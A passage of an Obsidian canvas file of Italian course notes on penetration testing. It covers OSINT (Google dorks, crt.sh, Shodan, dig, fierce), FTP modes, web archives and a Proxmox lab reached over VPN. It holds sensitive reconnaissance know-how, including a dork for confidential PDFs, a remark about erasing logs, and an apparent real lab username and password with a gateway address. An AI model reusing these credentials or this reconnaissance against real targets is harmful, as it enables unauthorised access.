interna).\n\n###### Consiglio pratico (speed-run)\n\n- Parti da 10 dork ben scelti (filetype, inurl, intitle).\n- Registra risultati in CSV.\n- Cross-check con Shodan/GitHub/Wayback per ricavare contesto.\n- Se trovi segreti: **non** usarli; segnala e coordina la rimozione.","x":-8061,"y":25186,"width":759,"height":1089,"color":"5"},
		{"id":"82997538f7c8c3aa","type":"text","text":"# Penetration Testing\n\nPartiamo da un presupposto: è praticamente impossibile fare un test di tutte le possibili risposte a tutti i possibili attacchi. Per questo, di norma si definiscono precisi target (***rules of engagement***) che definiscono quali host (e.g. una specifica sottorete), protocolli e attacchi (può comprendere tanto DoS quanto Social Engineering) verranno testati, e quali sono gli obiettivi.\n\nDetto questo, l'attività di penetration testing segue un pattern generale abbastanza standard:\n\n- ***Intelligence Gathering*** - Devo capire in modo com'è fatto il sistema, in due fasi:\n\t- ***Open Source Intelligence*** (***OSINT***) - Ricerca non intrusiva su dati di pubblico dominio:\n\t\t- ***Business Research*** - Vai su LinkedIn a leggere chi fa parte dell'azienda, che posizioni di lavoro offrono (da cui posso ricavare che tecnologie possiedono) e simili;\n\t\t- ***Google Hacking*** - Riquadro a parte perché sembra molto interessante;\n\t\t- `whois`, `nslookup`, `dig` - Il primo ti dice chi è il responsabile del nome risolto, gli altri due (`dig` è il più evoluto) ti dice vita, morte e miracoli del DNS attuale. Se poi vuoi fare ricerca aggressiva dei sottodomini, esiste `fierce`;\n\t\t- `traceroute` - Sappiamo cosa fa;\n\t\t- `shodan`, `serversniff` - \"Quali server sono attivi su questo dominio, e con quali porte aperte?\", \"Dove si trovano questi server? Cos'altro ospitano?\". `shodan` è spesso considerato una sorta di \"motore di ricerca per l'IoT\"\n\t\t- ***Wayback Machine*** - Riquadro a parte.\n\t- ***Intrusive Target Search***  - Qui serve un'autorizzazione, senza è ***illegale***. Parliamo di scan di porte aperte, servizi attivi, enumeration, e via dicendo. I tool più utilizzati sono `nessus`, `nexpose`,`OpenVAS`, `Nikto`, `Burp`, `Acutenix`.\n- ***Vulnerabilities Scan*** - Qui uso script che possono agilmente verificare la presenza di migliaia di problemi standard noti, producendo rapide spiegazioni dei rischi correlati e mitigazioni. Sono abbastanza inclini ai ***falsi positivi***. I metodi sono simili all'Intrusive Target Search, e fanno molto rumore sulla rete locale (ma di norma sei legalizzato, gli admin sanno cosa stai facendo);\n\t- I dati raccolti vengono confrontati con un DB (**NVD**, **National Vulnerability Database**) di ***CVEs*** (***Common Vulnerabilities and Exposures***) ***Identifiers*** con diversi valori associati: da dove arriva la minaccia, quanto è facile da sfruttare, altra roba e uno ***score*** complessivo.\n- ***Analisi dati*** - Non per forza devo essere online: una volta che ho raccolto i dati, basta guardarli per capire cosa c'è di problematico a priori; \n- ***Exploitation*** - Ho individuato una potenziale vulnerabilità, ora mettiamo le mani in pasta e vediamo se riusciamo effettivamente a bucare il sistema tramite essa. Qui si usano strumenti standard come `metasploit`, `BeEF`, `Throwback`;\n- ***Report*** - Autoesplicativo, magari dando un ordine prioritario ai fix più critici;\n- \"Ne riparliamo tra sei mesi, intanto vedi di fixare quello che ho trovato e vediamo se non crei altre vulnerabilità nel frattempo\".\n\nOra, esistono sforzi per standardizzare le procedure (e.g. OSSTMM, NIST SP 800-115) in modo consistente e ripetibile. Ovviamente, nessun attaccante reale segue delle procedure standard.","x":-7052,"y":26510,"width":759,"height":1089,"color":"6"},
		{"id":"d4c64776c6b34a41","type":"text","text":"## 📦 FTP: due canali separati\n\nIl protocollo FTP usa **due connessioni TCP**:\n\n- una **control connection** (porta 21 del server): comandi come `LIST`, `RETR`, `STOR`, ecc.\n    \n- una **data connection**: serve per trasferire i file (o le directory)\n    \n\nIl punto è: **chi apre la connessione dati? e verso chi?**  \nQuesto cambia **tra modalità attiva e passiva**.\n\n---\n\n## 🔁 FTP attivo\n\n- **Client** apre la control connection al server (`client:abcd → server:21`)\n    \n- Poi manda:  \n    `PORT x,y,z,w,a,b` → “collegati a me, all’indirizzo `x.y.z.w` porta `(a×256 + b)`”\n    \n- **Server** apre una nuova TCP verso il **client** per i dati\n    \n\n📌 **Problema**: se il client è dietro NAT, il server non può raggiungerlo direttamente → fallisce.\n\n---\n\n## 🧍‍♂️ FTP passivo\n\n- **Client** apre la control connection al server (`client:abcd → server:21`)\n    \n- Manda il comando `PASV`\n    \n- **Server risponde**:  \n    `227 Entering Passive Mode (a,b,c,d,e,f)`  \n    → “collegati tu a me, all’indirizzo `a.b.c.d` porta `(e×256 + f)`”\n    \n- **Client apre la connessione dati in uscita** al server\n    \n\n📌 **Vantaggio**: funziona anche dietro NAT, perché tutte le connessioni le apre il client → il NAT le lascia passare.","x":-7052,"y":23862,"width":759,"height":514,"color":"5"},
		{"id":"fe1e0f8a5385dd36","type":"text","text":"# How To OSINT (Gemini)\n\nFase Passiva: Il \"Fantasma\" (Google e Registri) - In questa fase non interagisci mai con i server della tua azienda. Interroghi terze parti che hanno già i dati.\n- **Google Dorking:** Inizia cercando documenti che non dovrebbero essere lì. Prova: `site:azienda.it filetype:pdf \"riservato\" OR \"confidenziale\"`. Se saltano fuori procedure interne o organigrammi con numeri di cellulare, hai già trovato un \"Data Leakage\".\n   - **Certificate Transparency (crt.sh):** Ogni volta che l'azienda chiede un certificato SSL (per il lucchetto verde di HTTPS), l'operazione viene registrata in log pubblici. Vai su [crt.sh](https://crt.sh/) e inserisci il dominio aziendale. Vedrai apparire sottodomini di cui forse ignoravi l'esistenza: `staging-vecchio.azienda.it`, `vpn-test.azienda.it`. Questi sono \"punti di ingresso\" che spesso sfuggono alla manutenzione ordinaria.\n   - **Shodan:** Inserisci l'indirizzo IP pubblico della tua azienda o il nome del brand su Shodan.\n    - **Il dubbio collaterale:** _\"Perché Shodan e non un port scan diretto?\"_. Perché se fai un port scan tu, il firewall aziendale vede il tuo IP che \"bussa\" a tutte le porte. Se usi Shodan, stai solo leggendo un database di scansioni che qualcun altro ha già fatto. È anonimo al 100%.\n    \nFase Semi-Passiva: Analisi DNS (dig e whois). Qui iniziamo a interrogare i server DNS. Non è un attacco, è un'operazione che avviene miliardi di volte al giorno, quindi è molto difficile che venga considerata sospetta.\n\n- **Interrogazione dei Record MX e TXT:** Usa `dig azienda.it ANY`. Cerca i record **SPF** (_Sender Policy Framework_). Sono stringhe di testo che dicono quali server sono autorizzati a inviare mail per conto dell'azienda. Spesso contengono intervalli di IP (`include:_spf.google.com` o IP statici di uffici periferici). È una mappa gratuita dei perimetri aziendali.\n- **WHOIS:** Serve a capire chi ha registrato il dominio. A volte trovi l'email privata di un amministratore o il numero di telefono diretto di un ufficio tecnico. In un attacco di _Social Engineering_, queste sono informazioni d'oro.\n    \nFase Attiva Leggera: Enumerazione (fierce). Se hai l'autorizzazione, puoi usare **fierce**. Perché si usa `fierce` invece di tirare a indovinare? Perché un dominio può avere migliaia di sottodomini. `fierce` prova un attacco a dizionario (testa parole comuni come `mail`, `dev`, `sql`) contro il server DNS aziendale per vedere quali rispondono.\n- **Attenzione:** Se l'IT ha configurato correttamente il DNS, potrebbe accorgersi che qualcuno sta facendo migliaia di richieste in pochi secondi. È qui che la tua attività da \"curioso\" inizia a sembrare un'attività da \"hacker\".\n\nAnalisi e Correlazione: Unire i puntini. Il vero lavoro dell'esperto OSINT inizia ora. Hai una lista di IP da Shodan, una lista di sottodomini da `crt.sh` e dei file PDF trovati con Google.\n\n- **Esempio concreto:** Trovi un sottodominio `camera-magazzino.azienda.it` tramite `crt.sh`. Vai su Shodan e vedi che quell'IP ha la porta 8080 aperta con un banner che dice \"Hikvision\". Cerchi su Google \"Hikvision default password\" o \"Hikvision CVE 2023\".\n- **Risultato:** Hai dimostrato che una telecamera del magazzino è esposta e potenzialmente vulnerabile, partendo da un semplice certificato SSL pubblico.","x":-7052,"y":25186,"width":759,"height":1089,"color":"5"},
		{"id":"4da9b83a85935c41","type":"file","file":"Security_Tests.png","x":-8311,"y":26510,"width":501,"height":449},
		{"id":"7d1a9e532c666555","type":"file","file":"Security_Tests_Scenarios.png","x":-8311,"y":27216,"width":500,"height":383},
		{"id":"2828319e402226ab","type":"text","text":"$$\\textcolor{red}{\\text{LEC  29/5/2025 Vulnerability assessment and penetration testing m 10}}$$","x":-4160,"y":28119,"width":742,"height":260,"color":"3"},
		{"id":"15a4ee5557c15826","type":"text","text":"# `dig` (Gemini)\n\nSe vuoi _solo_ l’IP, `ping` o `getent hosts` bastano.  `dig` serve quando vuoi capire **chi** ti ha risposto, **con che autorità**, **per quanto tempo** quella risposta è valida, **se la risposta è affidabile** e **dove** potrebbe essere manipolata Ogni opzione di `dig` esiste per rispondere a una di queste domande.\n\n```bash\ndig example.com\n```\n\nè la richiesta \"base\", che include il  `SERVER` che risponde, `Query time` e `flags` (ti dicono se c'è stata ricorsione, se è disponibile, livello di autorità, ...). Posso poi specificare come parametro il tipo di record che sto cercando: `A/AAAA` (`IPv4/IPv6`), `MX` (mailserver associato), `NS` (chi controlla il dominio), `TXT` (**policy, verifiche, segreti operativi** (SPF, DKIM, DMARC, token cloud, particolarmente utili in OSINT).\n\nPosso anche scegliere esplicitamente a quale server chiedere, e.g. `dig example.com @8.8.8.8`. Da questo posso dedurre cose tipo \"Se Google risolve e il mio ISP no sono dietro una qualche forma di **censura, poisoning o misconfigurazione**.\n\nPosso anche seguire l'intera catena gerarchica di risposta, chiedendo direttamente al `root NS`:\n\n```bash\ndig +trace example.com\n```\n\ndisattiva la ricorsione e chiede _tutta_ la catena di deleghe: `root` (`.`), `TLD` (`.com`), authoritative NS, risposta finale. Serve per verificare **deleghe rotte**, capire **dove finisce la fiducia**, smascherare **DNS hijacking**. Se una risposta “normale” è sospetta, `+trace` è il tuo **ground truth**.\n\nPosso anche forzare la risposta dal primo NS a cui chiedo, per vedere se risponde.\n\n```bash\ndig example.com +norecurse\n```\n\nSe lo fa, il server **ha autorità** o una cache già popolata. Questo distingue **resolver** e autoritativi.\n\nUn TTL alto (e.g. `example.com. 86400 IN A 93.184.216.34`) indica stabilità, cache longeva e poisoning più persistente, mentre uno basso CDN, failover, mitigazione DDoS. In incident response, il TTL ti dice **quanto a lungo il danno persiste**.\n\nPer un output minimale esiste l'opzione `+short`, per le info su `DNSSEC` c'è `+dnssec`. Con `+trace +dnssec` puoi seguire **la catena di fiducia crittografica**, non solo logica. Qui `dig` diventa uno strumento quasi da **crittoanalisi infrastrutturale**.\n\n```bash\ndig example.com +tcp\n```\n\nServe quando UDP è bloccato o vuoi capire se il resolver accetta fallback TCP.","x":-6043,"y":25186,"width":759,"height":1089,"color":"5"},
		{"id":"80cd5e7cc113b966","type":"text","text":"# Leonardo di Leonardo\n\nRiassunto delle cose che dice Leonardo, penetration tester per conto di Leonardo.\n\n\"La cosa più importante è pararsi preventivamente il culo con un legal agreement che certifica che in caso potremmo anche rompere roba, in modo che il cliente non possa querelarci. E comunque in genere si fa un backup prima di fare azioni potenzialmente distruttive.\n\nPoi, in genere lavoriamo da remoto con una VPN, ma a volte tocca andare con un laptop in presenza e, nei casi più estremi, cancellare tutti i log di quanto accaduto prima di andarcene.\n\n- Vulnerability Assessment - bisogna anzitutto settare gli strumenti sulla giusta aggressività (così evitiamo di rompere tutto). Possono metterci anche due giorni. Ci stanno un botto di falsi positivi, specialmente certificati SSL mal settati ed errori Firewall, e vanno faticosamente filtrati. Nel presentare il report di ciò che resta come vulnerabilità vera, il focus è su quelle critiche (facile sfruttarle, permettono controllo totale). Spesso sono legate a versioni non patchate dei server, e molto spesso la soluzione è fare un update all'ultima versione. Spesso però il porting è pesante, e anche un semplice update non è così immediato da fare. Ecco la top 3 vulnerabilità che mi piacciono [...]. Poi, ci sono un tot di pdf che presentiamo al cliente. Tra essi, uno molto interessante è \"Top25_Remediations.pdf\" che presenta le 25 patch che risolvono più problemi (una roba che genera `nessus` stesso). Visto che ci sono diversi tipi di vulnerabilità critiche (e.g. una su un server pubblico è più problematica di una su una rete interna), è comodo avere l'AI per fare una tier list di cosa va risolto prima.\n- Penetration Testing - Il VA diventa uno step preventivo, quindi vale tutto quello che ho detto sopra. Poi, ci sono siti molto carini che ti danno spunti per gli attacchi, tipo [questo](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/00-Introduction_and_Objectives/). Greybox = ho le credenziali ma non il sorgente, in questo caso. Una volta trovati i problemi, vanno mandati al giusto team che deve risolverli. Burp suite professional ci piace tanto, fa un sacco di roba.  XSS è gravissimooooo (sì ho capito zi basta). L'ho combinato con un'altra vulnerabilità per loggare come admin anche se non lo ero (ok sì questo è figo). Poi ho modificato una risposta `400` del server in una `200 OK` per uploadare un documento che non poteva essere uploadato.\n\t- Una cosa interessante è il problema di \"Client-Side Enforcement of Server-Side Security\". In pratica, il frontend ti impedisce di mandare una certa richiesta (e.g. il button non è clickable), ma se forgio il pacchetto in un altro modo il Server accetta la richiesta, anche se in teoria non avevo il permesso di ricevere risposta. Tradotto: non posso delegare al frontend la sicurezza del backend.\n\"","x":-6043,"y":26510,"width":759,"height":1089,"color":"4"},
		{"id":"ec1385f10cde2c03","type":"text","text":"# The Wayback Machine\n\nEsiste un sorprendente quantitativo di gente interessata a scandagliare, fotografare ed archiviare la storia di Internet, meno per motivi accademici e più perché i dati sono il nuovo petrolio: ci si addestrano modelli di AI, si scoprono, appunto, potenziali vulnerabilità, e simili. Magari nel 2012 era percepito come normale pubblicare in chiaro il numero di telefono personale di un CEO.\n\n***Internet Archive*** nasce nel 1998 con il nobile intento di non perdere la conoscenza sviluppata online, ma presto l'algoritmo di Page Rank di Google inizia a sfruttarlo per ottimizzare le sue prestazioni, rendendolo di fatto uno strumento utilizzato per scopi pubblicitari.\n\nNel 2007 nasce ***Common Crawl***, una no-profit che scansiona il web e mette i dati a disposizione di tutti. Come? Esistono SW detti ***crawlers*** (e.g. ***Heritrix***) che passano mesi a seguire tutti i possibili link esistenti, salvando i dati in blocco. I server ad oggi archiviano $O(10^{12})$ pagine. Visto che spesso i dati sono dinamici (i.e. il frontend non carica tutto subito), sempre più spesso i crawler fanno girare istanze \"headless\" dei browser (i.e. senza GUI) per simulare un utente reale (e.g. ***Browsertrix***).\n\nIn tutto questo, un \"gentlemen agreement\" prevede che chi scrive un sito includa nella root directory uno speciale file \"***robots.txt***\" con il quale si specifica a quali pagine ai crawler è consentito l'accesso e a quali no, spesso includendo anche una mappa del sito (formato `.xml`). Manco a dirlo, se sei un crawler poco etico questo è sostanzialmente un invito a guardare tutto, fregandotene delle indicazioni. Violare le indicazioni di `robots.txt` non comporta nulla di rilevante: è considerato solo \"maleducazione\". Al massimo, come owner del sito puoi creare una sorta di ***honeypot*** che ti avvisa quando qualcuno entra in una sezione proibita, loggando i suoi dati.\n\n\"Quindi ci stanno anche crawler non etici?\". Beh sì. I dati sono oro. A parte addestrarci le AI, come detto, aziende come **Censys** o **BinaryEdge** fanno scansioni continue dell'intero spazio IPv4 per vendere questi dati a Governi, Intelligence, Assicurazioni e, appunto, penetration testers.\n\nDetto questo, come accedo a queste incredibili risorse storiche?\n\n- ***[The Wayback Machine](https://web.archive.org)*** - Sito web con GUI pensato per umani;\n- ***Common Crawl*** - Pensato per addestrare le AI, ti scarichi tonnellate di dati grezzi dai server di Amazon e te li processi da solo. Qui vedi in web con qualche mese di ritardo;\n- ***Bright Data (Luminati)*** - Ti vendono dati per fare scraping senza essere bloccato;\n- ***Censys / Binary Edge*** - Più votato alla Cybersecurity ad alto livello (banche, governi);\n- ***Ahrefs / SEMRush*** - Qui il punto è questo: Page Rank funziona perché Google ha uno dei migliori DB di storico Internet al mondo, nonché il miglior algoritmo in sé. Visto che è tutto segreto a livello di paranoia, dall'esterno la gente prova a replicare queste performance. Questi due sono bot super-aggressivi che si occupano della componente \"social\" (quali pagine puntano a chi).","x":-7052,"y":27834,"width":759,"height":1089,"color":"4"},
		{"id":"036f9dbcc491c2c4","type":"text","text":"# SPACING","x":-7052,"y":28923,"width":250,"height":235,"color":"5"},
		{"id":"7115532522bd39df","type":"text","text":"# Network Hardening","x":-9319,"y":29158,"width":759,"height":1089,"color":"4"},
		{"id":"643923063b2cf969","type":"text","text":"# ISP Speciali & GARR\n\nIl concetto di ISP è: su scala regionale o nazionale creo un'infrastruttura cablata (che costituisce la backbone dell'ISP) che comprende router, server e quant'altro, quindi offro a varie entità (i.e. i clienti) la possibilità di usarla per creare connessioni tra di loro.\n\nEntro il mio ISP comunico con gli ***indirizzi shared address space*** (cfr. ***NAT***), mentre se voglio raggiungere un host di un altro ISP devo passare tramite i rispettivi ***edge router***, che di fatto formano \"ponti\" tra diversi ISP. Il ponte può collegare i due ISP in modo diretto (i.e. ci sono accordi per cui collego direttamente due edge router) oppure passare per un'infrastruttura intermedia, normalmente conosciuta come la ***backbone di Internet***.\n\nOra, capiamo bene che possono esistere ISP molto chiusi, e alcuni addirittura isolati dal resto di Internet. Se ho bisogno di una rete per collegare tutte le centrali nucleari d'Europa, a nessun pazzo verrebbe mai in mente di esporre questa rete ad Internet. Se devo creare la rete dei Servizi Segreti, questa avrà controlli rigidissimi sia in ingresso che in uscita, con pesanti firewall e meccanismi di autenticazione implementati negli edge router o nelle DMZ. Non posso entrare in dettaglio perché questi dati non sono di dominio pubblico :)\n\nPer le università abbiamo una via di mezzo. La rete ***GARR*** (***Gestione Ampliamento Rete e Ricerca***) è un ISP per centri di ricerca, scuole, biblioteche e affini. Possiede su territorio italiano un centinaio di ***Points of Presence*** (***PoP***, ognuno contenenti uno o più edge router) collegati a vari ***IXP*** (per raggiungere altri ISP e/o la backbone di Internet), e soprattutto alla rete ***GÉANT*** (una backbone che collega tra loro le reti di ricerca nazionali di una trentina di paesi, principalmente europei ma con svariati outsider).\n\nGARR acquista e/o affitta ***fibra nera*** (o ***spenta***), i.e. i soli cavi, quindi ***illumina*** l'infrastruttura con le proprie tecnologie (i.e. ci mette i suoi multiplexer, router, protocolli e simili). Questo perché ovviamente l'ambiente di ricerca vuole un proprio controllo capillare sulle tecnologie implementate (gli ***operatori wholesale*** come ***OpenFiber*** che affittano l'infrastruttura offrono agli ISP il \"pacchetto completo\", ***bitstream***, i.e. fanno anche routing e affini)","x":-23931,"y":29192,"width":759,"height":776,"color":"4"},
		{"id":"baed3a234e9a9714","type":"text","text":"# Proxmox\n\nProxmox è un SO open-source per `server` specializzato nell'implementare una ***piattaforma di virtualizzazione*** che permette di gestire una rete virtuale popolata da macchine virtuali.\n\nViene usato principalmente per testare configurazioni di rete complesse (che è esattamente quello che facciamo con la rete virtuale ACME).\n\nSe in esecuzione su un server, la sua GUI è normalmente accessibile sulla porta `8006`.","x":-22922,"y":30203,"width":759,"height":323,"color":"6"},
		{"id":"de4a519c8760f4a6","type":"text","text":"# firewall\n\nhanno opnsense e bsd, che è la distro più sicura di linux rispetto a buffer overflow, memory management, ...\n\nIDS/IPS: suricata","x":-24962,"y":30654,"width":640,"height":240},
		{"id":"01850fc4ac1a98ce","type":"text","text":"# Proxmox su GARR\n\nCosa succede se un'università vuole creare un ambiente Proxmox? Ha bisogno anzitutto di un `server`, che verosimilmente si trova sulla rete interna GARR e che quindi ha un indirizzo `shared address space`. E come ci accedo? Ovvio che se mi connetto da un'università sono già sulla rete GARR, ma se fosse sufficiente questo avrei due problemi:\n\n- Potrei essere letteralmente chiunque che si collega alla rete universitaria e fa danni;\n- Se provo a connettermi dall'esterno della rete GARR non raggiungerò mai il server.\n\nPer ovviare a questi problemi usiamo una ***VPN***. Le reti `151.97.0.0/16` e `151.100.0.0/16` sono assegnate a GARR ([IPinfo](https://ipinfo.io/dashboard/lookup/151.100.174.34?lookup_source=search-bar-dashboard), sito molto utile tra l'altro), quindi non ci sorprende l'idea che il ***VPN Gateway*** `151.100.174.34 5003` indicato nel file `cognome.matricola.ovpn` possa essere in una DMZ della rete GARR.\n\nAutenticarsi su questo server crea un tunnel che ci piazza a livello logico dentro la rete GARR. Non solo: il Gateway sa chi siamo, e quando chiediamo `100.64.0.2:8006` ***può*** scegliere a quale server inoltrare le nostre richieste sulla base della nostra identità (nota che questa è una mia supposizione, è possibile ma non ho alcuna certezza a riguardo). In ogni caso, il succo è: visto che ora siamo autenticati e risultiamo dentro la rete GARR possiamo accedere ad alcuni servizi (sulla base della nostra identità) tramite `shared address space`. Benvenuti su Proxmox.","x":-23931,"y":30761,"width":759,"height":810,"color":"4"},
		{"id":"fe60ba66cb71ba5e","type":"text","text":"# ACME\n\nscarichi il file di configurazione `.ovpn`, esegui `sudo openvpn --config filediconfigurazione.ovpn`, questo genera una nuova interfaccia `tap0` che è un cavo ethernet virtuale verso la rete interna `100.100.roba`. Non ho ben capito dove siamo precisamente, da capire.\n\nContattiamo quindi `100.64.0.2:8006`, che però a quanto pare è un indirizzo esterno al quale posso accedere solo da dentro? Penso questo perché il suo traffico passa da tap0 (visto con wireshark) e senza VPN non mi ci fa accedere. L'altra domanda sarebbe: come faccio a sapere quale traffico far passare per `enp0s3` e quale per `tap0`??\n\nSta di fatto che in questo `100.64.0.2:8006` ci sta un pannello di controllo per tutto l'environment ACME virtuale. accendiamo alcune macchine, tra cui fondamentale `client-ext-1` e `main-firewall-router`. Dal primo facciamo `dhclient` e otteniamo un ipv4, quindi accediamo da browser a `100.100.4.1` che è il `main-firewall-router`. Nota che non riesco ad accederci da browser della VM, quindi non siamo collegati su questa subnet con tap0.\n\nOra, quelle due VM sono connesse (vedi topologia in basso a sx). Ci sono altre due VM con immagine un computerino (che mi pare siano le uniche per le quali ci sono le credenziali di login): una è `internal-firewall-router` (autoesplicativo, nonché presente nella topologia) e `kali.acme-03`, che secondo me nella foto della topologia è PC (infatti se eseguo `dhclient` non funziona finché non avvio `internal-firewall`, il che significa che è il router a cui fa riferimento).\n\nIn ogni caso segue setup del server DNS, che vale solo per la rete locale (per richieste tipo google.com sei ancora costretto ad andare all'esterno). Questa cosa si fa dal file `/etc/dnsmasq.conf` secondo le indicazioni del video su classroom\n\nper aggiungere un nuovo host al dns server, aggiungere al file `/etc/hosts` la nuova coppia `IP NOME` (lui mette sia ipv4 che ipv6 su due linee separate, e per ognuna mette due nomi: uno \"pulito\" tipo `webserver` e uno con il dominio tipo `webserver.acme-03.test`) e poi `sysctl restart dnsmasq` per ricaricare subito i nuovi parametri. segue ping per testare i nomi.\n\nper testare il dnsserver possiamo scrivere `host webserver 100.100.1.2` da un'altra macchina (tipo log). In pratica manda una richiesta dns all'indirizzo `100.100.1.2` per risolvere il nome `webserver`. Vabbè visto che nel setting del dnsserver c'è il dnsserver stesso faccio `host dnsserver 100.100.1.2` così mi compare sul terminale della macchina l'IPv6 del dnsserver che altrimenti sarebbe una roba lunga da copiare a mano e lo metto in `/etc/resolv.conf`.\n\n# Credenziali\n\ndonato.1808606\ned5d8a4cc20ade2e4f6b\n\nRealm: Proxmox VE authentication server","x":-21912,"y":29158,"width":1258,"height":2413,"color":"6"},
		{"id":"4b9eddfe8a6c2427","type":"text","text":"# IPv6 Setting\n\nquando faccio Prefix Delegation i 64 bit di rete sono così divisi\n\n- i primi tre hextet sono stabiliti dall'ISP che delega\n- l'ultimo è diviso in due byte (o 4 nibbles, i.e. coppie di hex)\n\t- il primo definisce in quale sottorete ACME siamo (e.g. `ACME-90` sarà `5A`, nel nostro caso `03` resta `3`)\n\t- il secondo lo uso io per fare subnetting. dividiamo la rete in 4 sottoreti, i.e. `00`, `40`, `80` e `B0`. Assegniamo le prime due al main firewall e le altre due all'internal. Segue che (e.g.) qualsiasi host connesso all'internal firewall ha come quarto hextet una roba del tipo `3XY` dove `X` va da `8` a `F` e `Y` da `0` a `F`. Chiaro no?\n\nQuindi abbiamo dentro `ACME-03` abbiamo indirizzi `/56`. Li dividiamo in 4 sottoreti","x":-21662,"y":27346,"width":759,"height":668}
	],
	"edges":[
		{"id":"428ec3c727bcfebf","fromNode":"22dfa299c258426a","fromSide":"top","toNode":"8603be4ae948e472","toSide":"bottom"},
		{"id":"0f8ae08f684e1ba4","fromNode":"22dfa299c258426a","fromSide":"left","toNode":"4282f1f0f685c1b7","toSide":"right"},
		{"id":"3b8450f5d7d06324","fromNode":"22dfa299c258426a","fromSide":"top","toNode":"eab759960ddcf808","toSide":"bottom"},
		{"id":"b97dacf49ed55fcb","fromNode":"0f2a36c9dcf84a3e","fromSide":"right","toNode":"7b351e91b16f865e","toSide":"left"},
		{"id":"1eec059325077352","fromNode":"7b351e91b16f865e","fromSide":"top","toNode":"22dfa299c258426a","toSide":"bottom","label":"How to get there?"},
		{"id":"cdbb7c68033e5b65","fromNode":"7b351e91b16f865e","fromSide":"bottom","toNode":"1cdecb81c364493b","toSide":"top","label":"Where am I?"},
		{"id":"c13c78293edc7b6d","fromNode":"7b351e91b16f865e","fromSide":"right","toNode":"ea0a31adef225299","toSide":"left"},
		{"id":"bda9d6a558058968","fromNode":"ea0a31adef225299","fromSide":"top","toNode":"d8bd274b8f96df69","toSide":"bottom"},
		{"id":"3d3d010e414423c8","fromNode":"ea0a31adef225299","fromSide":"bottom","toNode":"04825a06a9d94d59","toSide":"top"},
		{"id":"6ba4b4daaae0441c","fromNode":"ea0a31adef225299","fromSide":"right","toNode":"625ede0e186681f5","toSide":"left"},
		{"id":"5359adb1693d9726","fromNode":"d8bd274b8f96df69","fromSide":"right","toNode":"4e494b0e134ff4a7","toSide":"left"},
		{"id":"f9071934d54f1998","fromNode":"625ede0e186681f5","fromSide":"top","toNode":"4e494b0e134ff4a7","toSide":"bottom"},
		{"id":"e5c67dbcd146b146","fromNode":"04825a06a9d94d59","fromSide":"bottom","toNode":"3d73dc291ec51cb6","toSide":"top"},
		{"id":"38de5c3f0b17d32d","fromNode":"3d73dc291ec51cb6","fromSide":"right","toNode":"efbeb23d6fccc658","toSide":"left"},
		{"id":"66a677d308a98e43","fromNode":"04825a06a9d94d59","fromSide":"right","toNode":"efbeb23d6fccc658","toSide":"left"},
		{"id":"c00a9d792bd09d56","fromNode":"efbeb23d6fccc658","fromSide":"bottom","toNode":"592cc115c760d58b","toSide":"top"},
		{"id":"4c7f78114b7c8129","fromNode":"ea0a31adef225299","fromSide":"top","toNode":"4e494b0e134ff4a7","toSide":"bottom"},
		{"id":"e3085dcdb384f960","fromNode":"4e494b0e134ff4a7","fromSide":"top","toNode":"b008c9c94e60d49d","toSide":"bottom"},
		{"id":"5de8114eb7808ca7","fromNode":"4e494b0e134ff4a7","fromSide":"top","toNode":"b3872fe16b478ecb","toSide":"bottom"},
		{"id":"620010ae0292ff42","fromNode":"b3872fe16b478ecb","fromSide":"top","toNode":"db8524057030a7aa","toSide":"bottom"},
		{"id":"30a1708adf9120a5","fromNode":"db8524057030a7aa","fromSide":"left","toNode":"1e4bdb54f9ff41bb","toSide":"right"},
		{"id":"7bbfe86e354e11ed","fromNode":"db8524057030a7aa","fromSide":"right","toNode":"9d6e1bc42fdc8fff","toSide":"left"},
		{"id":"b68568742b046ca0","fromNode":"9353a581758bae87","fromSide":"top","toNode":"9d6e1bc42fdc8fff","toSide":"bottom"},
		{"id":"14a1a2a060a23607","fromNode":"db8524057030a7aa","fromSide":"right","toNode":"9353a581758bae87","toSide":"left"},
		{"id":"3b09bf2c29cee2c5","fromNode":"db8524057030a7aa","fromSide":"top","toNode":"725abded725d4498","toSide":"bottom"},
		{"id":"ab9bccd43d4b692d","fromNode":"b008c9c94e60d49d","fromSide":"right","toNode":"2d903151dad0b196","toSide":"left"},
		{"id":"f20c7728e211c431","fromNode":"4e494b0e134ff4a7","fromSide":"right","toNode":"2e2f2fffcb29a514","toSide":"left"},
		{"id":"30acbdd63f807416","fromNode":"4e494b0e134ff4a7","fromSide":"bottom","toNode":"7be47aaf1eeeeb0d","toSide":"top"},
		{"id":"9b1ddf1a628d2da5","fromNode":"625ede0e186681f5","fromSide":"right","toNode":"19241c3faaf980ec","toSide":"left"},
		{"id":"16c1578973d5ed8d","fromNode":"625ede0e186681f5","fromSide":"top","toNode":"2e2f2fffcb29a514","toSide":"bottom"},
		{"id":"a11cccead9f2dfe0","fromNode":"19241c3faaf980ec","fromSide":"bottom","toNode":"d6df1ebc088bc55b","toSide":"top"},
		{"id":"3f43813ae6dda381","fromNode":"19241c3faaf980ec","fromSide":"bottom","toNode":"fde5e59d70e6ddbe","toSide":"top"},
		{"id":"97e49f4ab1d118a3","fromNode":"19241c3faaf980ec","fromSide":"bottom","toNode":"28c7fa5a4a2add1f","toSide":"top"},
		{"id":"3e74ea0b969c67d7","fromNode":"28c7fa5a4a2add1f","fromSide":"bottom","toNode":"09449e1e2bf4e019","toSide":"top"},
		{"id":"f0318b1cdc3881bc","fromNode":"19241c3faaf980ec","fromSide":"right","toNode":"22b8634d71376455","toSide":"left"},
		{"id":"00741801b9d873d6","fromNode":"2e2f2fffcb29a514","fromSide":"right","toNode":"df5e2abc8ea4b780","toSide":"left"},
		{"id":"66c11ba53c554d96","fromNode":"22b8634d71376455","fromSide":"top","toNode":"3565595bf897b446","toSide":"bottom"},
		{"id":"05456b6d30048acb","fromNode":"22b8634d71376455","fromSide":"top","toNode":"603628298b4df9a2","toSide":"bottom"},
		{"id":"7dd25d49892a4964","fromNode":"d6df1ebc088bc55b","fromSide":"right","toNode":"0e6f99d9025a7954","toSide":"left"},
		{"id":"d82539944e94e697","fromNode":"22b8634d71376455","fromSide":"top","toNode":"c77fc76ca3f24940","toSide":"bottom"},
		{"id":"56fd97094b3cb634","fromNode":"603628298b4df9a2","fromSide":"top","toNode":"5cce19db2eacb68d","toSide":"bottom"},
		{"id":"9591b59f3b3be6dc","fromNode":"603628298b4df9a2","fromSide":"top","toNode":"ea6a4509f0ba551c","toSide":"bottom"},
		{"id":"448ea8b3e69ae08a","fromNode":"22b8634d71376455","fromSide":"bottom","toNode":"0e6f99d9025a7954","toSide":"top"},
